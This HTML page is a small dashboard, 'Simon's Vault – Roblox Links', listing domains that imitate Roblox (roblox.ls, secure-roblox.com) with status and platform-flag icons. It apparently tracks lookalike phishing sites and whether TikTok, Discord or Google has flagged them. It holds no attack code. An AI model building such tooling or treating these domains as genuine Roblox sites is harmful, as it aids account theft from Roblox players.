<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Simon's Vault ‚Äì Sites Dashboard</title>
  <style>
    body {
      background-color: #0d0d0d;
      color: #fff;
      font-family: 'Segoe UI', sans-serif;
      margin: 0;
      padding: 2em;
    }
    h1 {
      text-align: center;
      color: #00ffc3;
      margin-bottom: 1em;
    }
    table {
      width: 100%;
      border-collapse: collapse;
      margin-top: 1em;
    }
    th, td {
      padding: 1em;
      border-bottom: 1px solid #444;
      text-align: left;
    }
    th {
      color: #00ffc3;
    }
    .status-online {
      color: #00ff80;
      font-weight: bold;
    }
    .status-down {
      color: #ff4c4c;
      font-weight: bold;
    }
    .icon {
      margin-right: 0.5em;
      vertical-align: middle;
    }
  </style>
</head>
<body>
  <h1>üåê Simon‚Äôs Vault ‚Äì Roblox Links</h1>
  <table>
    <thead>
      <tr>
        <th>Domain</th>
        <th>Status</th>
        <th>Flags</th>
        <th>Action</th>
      </tr>
    </thead>
    <tbody>
      <tr>
        <td>roblox.ls</td>
        <td class="status-online">Online</td>
        <td>
          <img class="icon" src="https://cdn-icons-png.flaticon.com/512/2504/2504941.png" width="20" alt="TikTok" />
          <img class="icon" src="https://cdn-icons-png.flaticon.com/512/3670/3670157.png" width="20" alt="Discord" />
        </td>
        <td><a href="https://roblox.ls" target="_blank">Dashboard</a></td>
      </tr>
      <!-- Repeat for each domain -->
      <tr>
        <td>secure-roblox.com</td>
        <td class="status-down">Unflagged</td>
        <td>
          <img class="icon" src="https://cdn-icons-png.flaticon.com/512/270/270798.png" width="20" alt="Google" />
        </td>
        <td><a href="https://secure-roblox.com" target="_blank">Dashboard</a></td>
      </tr>
    </tbody>
  </table>
</body>
</html>
